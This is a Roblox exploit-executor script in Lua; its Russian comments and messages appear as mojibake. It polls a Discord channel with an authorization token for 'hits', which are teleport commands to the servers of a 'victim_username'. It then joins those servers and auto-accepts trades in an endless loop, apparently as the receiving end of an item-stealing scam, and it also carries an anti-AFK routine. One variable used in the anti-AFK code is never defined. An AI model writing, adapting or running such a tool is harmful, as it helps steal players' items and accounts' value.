if not game:IsLoaded() then
    game.Loaded:Wait()
    print("‚úÖ –ò–≥—Ä–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞")
end

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –∏ ID –∫–∞–Ω–∞–ª–∞
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("‚ùå –î–æ–±–∞–≤—å —Ç–æ–∫–µ–Ω –∏ channelId –≤ —Å–∫—Ä–∏–ø—Ç!")
    return
end

-- Anti-AFK
local VirtualUser = game:GetService('VirtualUser')
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualInputManager:SendMouseButtonEvent(0,0,0,true,game,0)
    task.wait(0.1)
    VirtualInputManager:SendMouseButtonEvent(0,0,0,false,game,0)
    print("üîÑ Anti-AFK –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω")
end)

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Ñ–∞–π–ª–æ–≤
local HttpService = game:GetService("HttpService")
if not isfile("user.txt") then writefile("user.txt", "victim_username") end
if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end

local victimUser = readfile("user.txt")
local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
local isTeleporting = false

-- –£–ª—É—á—à–µ–Ω–Ω—ã–π –ø–∞—Ä—Å–∏–Ω–≥ –∫–æ–º–∞–Ω–¥—ã —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏
local function findTeleportCommand(content)
    if not content then return nil, nil end
    
    -- –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –ø–æ–∏—Å–∫ (–∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç –ª–∏—à–Ω–∏–µ –ø—Ä–æ–±–µ–ª—ã –∏ –∫–∞–≤—ã—á–∫–∏)
    local patterns = {
        'TeleportService%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
        'game:GetService%s*%("TeleportService"%)%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
    }
    
    for _, pattern in ipairs(patterns) do
        local placeId, jobId = content:match(pattern)
        if placeId and jobId then
            return placeId, jobId
        end
    end
    
    return nil, nil
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Discord
local function checkDiscord()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['Content-Type'] = 'application/json'
        }
    })

    if not response.Success then
        warn("‚ùå –û—à–∏–±–∫–∞ Discord API: "..tostring(response.StatusCode))
        return
    end

    local messages = HttpService:JSONDecode(response.Body)
    for _, msg in ipairs(messages) do
        if msg.content and msg.content:find("TeleportService") then
            print("\nüîç –ù–∞–π–¥–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ö–∏—Ç–æ–º! ID:", msg.id)
            print("üìÑ Content:", string.sub(msg.content, 1, 100).."...") -- –í—ã–≤–æ–¥–∏–º —á–∞—Å—Ç—å –∫–æ–Ω—Ç–µ–Ω—Ç–∞
            
            local placeId, jobId = findTeleportCommand(msg.content)
            if placeId and jobId then
                print("üéØ –ù–∞–π–¥–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏:")
                print("   PlaceID:", placeId)
                print("   JobID:", jobId)
                
                if not table.find(joinedIds, msg.id) then
                    table.insert(joinedIds, msg.id)
                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                    
                    print("üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä...")
                    isTeleporting = true
                    local success, err = pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
                    end)
                    
                    if not success then
                        warn("‚ùå –û—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏:", err)
                        isTeleporting = false
                    end
                    return
                else
                    print("‚ö†Ô∏è –£–∂–µ –ø—Ä–∏—Å–æ–µ–¥–∏–Ω—è–ª–∏—Å—å –∫ —ç—Ç–æ–º—É —Ö–∏—Ç—É")
                end
            else
                print("‚ùå –ù–µ –Ω–∞–π–¥–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏ –≤ content!")
                print("–ü—Ä–æ–≤–µ—Ä—å –ø–∞—Ç—Ç–µ—Ä–Ω—ã –ø–æ–∏—Å–∫–∞ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ findTeleportCommand")
            end
        end
    end
end

-- –ê–≤—Ç–æ–ø—Ä–∏–Ω—è—Ç–∏–µ —Ç—Ä–µ–π–¥–æ–≤
local function autoAcceptTrade()
    while task.wait(1) do
        pcall(function()
            game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
        end)
    end
end

-- –ó–∞–ø—É—Å–∫
task.spawn(autoAcceptTrade)

print("‚ú® –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω! –û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö —Ö–∏—Ç–æ–≤...")
while task.wait(5) do
    if not isTeleporting then
        pcall(checkDiscord)
    else
        print("üîÑ –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏...")
    end
end
